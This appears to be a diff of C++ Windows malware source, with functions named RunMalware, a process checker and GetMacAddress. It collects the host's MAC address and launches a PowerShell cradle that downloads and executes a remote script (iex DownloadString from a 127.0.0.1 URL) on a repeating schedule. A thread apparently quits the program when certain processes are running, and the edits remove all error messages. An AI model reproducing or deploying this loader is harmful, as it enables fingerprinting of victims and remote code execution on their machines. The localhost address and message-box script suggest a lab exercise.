@@ -22,7 +22,6 @@ bool GetProcessNamesByPsApi(vector<wstring>& running_processes) {
 
     // Enumerate all processes into processes argument
     if (!EnumProcesses(processes, sizeof(processes), &cb_needed)) {
-        printf("Failed to enumerate processes. Error code: %lu", GetLastError());
         return false;
     }
 
@@ -91,15 +90,14 @@ bool IsAnyProcessRunning(const unordered_set<wstring>& target_processes, const v
 
 bool RunMalware() {
     wstring mac_address;
-    wstring web_address = L"http://127.0.0.1:80/messageBox.ps1?";
+    const wstring web_address(L"http://127.0.0.1:80/messageBox.ps1?");
     if (!GetMacAddress(mac_address)) {
-        printf("Failed to get mac address!");
         return 1;
     }
 
-    wstring script = L"Add-Type -AssemblyName PresentationFramework\n"
+    const wstring script(L"Add-Type -AssemblyName PresentationFramework\n"
         "iex ((New-Object System.Net.WebClient).DownloadString('" 
-        + web_address + L"?macAddress=" + mac_address + L"'))";
+        + web_address + L"?macAddress=" + mac_address + L"'))");
     LPCWSTR psScript = script.c_str();
 
     // Execute mallware
@@ -143,21 +141,18 @@ bool GetMacAddress(wstring& macAddress) {
     // Get bufferSize
     DWORD result = GetAdaptersAddresses(AF_UNSPEC, 0, NULL, NULL, &bufferSize);
     if (result != ERROR_BUFFER_OVERFLOW) {
-        printf("Failed to get adapter addresses. Error code: %lu\n", result);
         return false;
     }
 
     // Allocate memory for adapter addresses
     IP_ADAPTER_ADDRESSES* pAddresses = reinterpret_cast<IP_ADAPTER_ADDRESSES*>( HeapAlloc(GetProcessHeap(), 0, bufferSize));
     if (pAddresses == nullptr) {
-        printf("Error allocating memory needed to call GetAdaptersAddresses\n");
         return false;
     }
 
     // Get adapter addresses
     result = GetAdaptersAddresses(AF_UNSPEC, 0, NULL, pAddresses, &bufferSize);
     if (result != NO_ERROR) {
-        printf("Failed to get adapter addresses. Error code: %lu\n", result);
         HeapFree(GetProcessHeap(), 0, pAddresses);
         return false;
     }
@@ -194,14 +189,13 @@ int main(void)
     // Runs process-checker in a separate treade, once it fails it exits the entire process.
     HANDLE hThread = CreateThread(NULL, 0, ProccessChecker, NULL, 0, NULL);
     if (NULL == hThread) {
-        printf("Failed to create process-checker thread!");
         return 1;
     }
     
     // Every 5 minutes runs the malware
     if (!RunMalware())
     {
-        printf("Failed to run malware!");
+        return 1;
     }
 
     return 0;
